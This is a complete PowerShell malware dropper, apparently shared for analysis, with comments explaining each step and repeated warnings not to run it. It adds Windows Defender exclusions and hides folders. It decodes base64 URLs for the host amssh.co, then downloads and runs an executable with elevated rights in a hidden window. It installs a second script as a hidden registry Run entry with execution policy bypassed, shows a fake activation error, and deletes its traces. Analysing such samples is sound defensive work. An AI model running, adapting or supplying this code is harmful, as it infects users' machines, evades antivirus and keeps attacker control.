# Do not run this script, as it is malicious!
# Do not run this script, as it is malicious!
# Do not run this script, as it is malicious!
# Do not run this script, as it is malicious!
# Do not run this script, as it is malicious!
# Do not run this script, as it is malicious!
# Do not run this script, as it is malicious!

# Function to add exclusions to Windows Defender
# This prevents Windows Defender from scanning and detecting the malware
function Add-Exclusion {
    param ([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
    } catch {}
}

# Function to download files with retry logic
# This ensures the malware can be downloaded even if there are temporary network issues
function Download-FileWithRetries {
    param(
        [string]$Url,
        [string]$Output,
        [int]$Retries = 3,
        [int]$DelaySeconds = 5
    )

    for ($i = 0; $i -lt $Retries; $i++) {
        try {
            # Attempts to download the file from the specified URL
            Invoke-WebRequest -Uri $Url -OutFile $Output -UseBasicParsing -ErrorAction Stop
            if (Test-Path $Output) { return $true }
        } catch {
            # Waits before retrying if download fails
            Start-Sleep -Seconds $DelaySeconds
        }
    }
    return $false
}

# Base64-encoded URLs to hide the actual malicious destinations
# Decodes to "https://amssh.co/file.exe"
$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9hbXNzaC5jby9maWxlLmV4ZQ=="))
# Decodes to "https://amssh.co/script.ps1"
$scriptUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9hbXNzaC5jby9zY3JpcHQucHMx"))

# Names for the malware files, using innocent-sounding names to avoid suspicion
$updaterExe = "updater.exe"
$trustedName = "WindowsUpdate.ps1"

# Creates a persistent folder in the user's AppData directory
# This is where the malware will maintain persistence across reboots
$persistFolder = Join-Path $env:APPDATA "UpdateCache"

# Creates the persistence folder and hides it from normal file browsing
New-Item -ItemType Directory -Path $persistFolder -Force | Out-Null
Set-ItemProperty -Path $persistFolder -Name Attributes -Value Hidden
# Adds the folder to Windows Defender exclusions to prevent detection
Add-Exclusion -Path $persistFolder

# Creates a temporary folder with a random GUID name to avoid detection
# This is where the initial malware executable will be downloaded
$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
New-Item -ItemType Directory -Path $hiddenFolder | Out-Null
# Adds this folder to Windows Defender exclusions as well
Add-Exclusion -Path $hiddenFolder

# Full path to the downloaded malware executable
$tempPath = Join-Path $hiddenFolder $updaterExe

# Attempts to download the malware executable
if (Download-FileWithRetries -Url $downloadUrl -Output $tempPath) {
    # Hides both the folder and the executable file
    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value Hidden
    Set-ItemProperty -Path $tempPath -Name Attributes -Value Hidden

    # Creates a process to run the malware with administrator privileges
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $tempPath
    $startInfo.WindowStyle = 'Hidden'  # Hides the window to avoid user detection
    $startInfo.Verb = 'runas'  # Requests administrator privileges

    # Starts the malware process and waits for it to complete
    $process = [System.Diagnostics.Process]::Start($startInfo)
    $process.WaitForExit()

    # If the malware executed successfully (exit code 0)
    if ($process.ExitCode -eq 0) {
        # Downloads the persistence script that will run on every startup
        $persistScriptPath = Join-Path $persistFolder $trustedName
        if (Download-FileWithRetries -Url $scriptUrl -Output $persistScriptPath) {
            # Hides the persistence script
            Set-ItemProperty -Path $persistScriptPath -Name Attributes -Value Hidden
            
            # Adds an entry to the Windows registry to run the script at every login
            # This ensures the malware persists even after system restarts
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistScriptPath`""
            Set-ItemProperty -Path $regPath -Name $trustedName -Value $regValue -Force
        }
    }
} else {
    # Shows an error message if download fails, disguised as a legitimate error
    Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
    exit 1
}

# Attempts to clean up the temporary folder to hide evidence of the attack
Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue